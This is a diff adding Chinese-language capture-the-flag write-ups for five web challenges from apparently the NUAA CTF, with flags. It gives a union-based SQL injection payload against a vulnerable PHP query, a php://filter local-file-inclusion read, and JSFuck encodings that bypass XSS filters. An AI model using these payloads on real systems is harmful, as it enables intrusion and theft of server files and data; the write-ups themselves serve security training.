@@ -2,6 +2,112 @@
 
 ## 0x00 WEB
 
+### web50
+
+右键查看网页源代码，看到一段被html注释掉的内容，找到flag **nuaactf{buddha_b1ess_us_n0_bug_233}**
+
+### web100
+
+考查 源码泄露，SQL注入
+
+步骤 找到.bak备份文件打开，Ctrl+F搜索flag定位到关键代码
+```
+$sql = "SELECT `admin` FROM `users` WHERE `username` = '{$_SESSION['user']}' LIMIT 1";
+        $res = $db->query($sql);
+        $admin = intval($res->fetch_assoc()['admin']);
+        if ($admin === 1) {
+            echo '<div>Flag: <pre>' . FLAG . '</pre></div>';
+```
+显然 **$_SESSION['user']** 是注入点，并且可以通过注册任意用户名来控制，然后就可以为所欲为了。 
+
+由于过滤不严格，只要使查询语句返回1就可以爆出flag，参考payload: **me' and 1=0 union select 1#**
+
+flag: **nuaactf{do_!_B_anxious_MY_friend.}**
+
+### web150
+
+题目循环检测alert并删除，试了各种编码无效，想到jsfuck编码可以被js执行，成功绕过。
+
+![](http://oxm4hc2s3.bkt.clouddn.com/3.png)
+
+当然要先闭合前边的引号，后边可以闭合或直接注释掉。
+
+flag: **nuaactf{3a5y_xSS_23333_66666}**
+
+### web200
+
+打开页面发现页面跳转到 **?file=flag** ，并显示
+```
+nuaactf{this_is_the_fake_flag} 
+
+Sorry, this is not the real flag.
+```
+这题虽然200分，入手点还是有很多的。
+
+1. 尝试修改查询字符串(随便修改)，会报错
+```
+require_once(): Failed opening required 'flag.php.php'
+```
+说明原本查询的文件为flag.php，require_once('flag.php')将其中的php代码执行而没有输出
+
+2. 或者删去查询字符串，执行
+```
+curl "http://localhost/www/index.php"
+```
+发现原页面内容为空，显然假的flag显示是包含的文件，进一步猜想php代码没有显示。
+
+3. 最后用php://filter/read=convert.base64-encode/resource=flag即可显示文件内容，只需再base64解码即可。
+
+### web300
+
+这就是这次比赛最开心的一道题了，进去之后发现正则匹配对输入进行了过滤，'[^\\[\\]\\!\\+]+/g'，也就是说只能使用 **[]!+** 四个字符进行构造，想到jsfuck， **eval(eval(input) + \'(1)\')** ，综合题意，只要可以使用eval(input)构造出'alert'字符串即可。
+
+get到jsfuck的编码方式，就解开了本题。记录如下：
+
+```jsfuck
+以下内容基于
+[]      =>  []
+
+然后!可以将原类型转化为布尔型
+![]     =>  false
+!![]    =>  true
+
++可以将原类型转化为整形
++[]     =>  0
++![]    =>  0
++!![]   =>  1
+然后可以推出所有数字 
+
+然后+[]可以转化为字符串
+[]+[]   =>  ""
+![]+[]  =>  "false"
+或放在前边
+[]+![]  =>  "false"
++[]+[]  =>  "0"
+
+加括号试试
+([]+![])  =>  "false"
+[[]+![]]  =>  ["false"]
+(+[]+[])  =>  "0"
+[+[]+[]]  =>  ["0"]
+
+可以类似数组取下标
+(![]+[])[+!![]] =>  'a'
+
+然后就可以从'false', 'true'中依次读出'a','l','e','r','t'。em...但是题目过滤了小括号。需要稍微绕一下，考虑使用中括号
+[[]+![]]    =>  ["false"]
+[![]+[]][+[]]    =>  "false"
+[![]+[]][+[]][+!![]]    =>  'a'
+
+成功
+
+最后用加号拼出"alert"即可。
+```
+
+![](http://oxm4hc2s3.bkt.clouddn.com/2.png)
+
+flag: nuaactf{NOT_the_jsF**k_at_a11}
+
 ## 0x01 REV
 
 ## 0x02 PWN
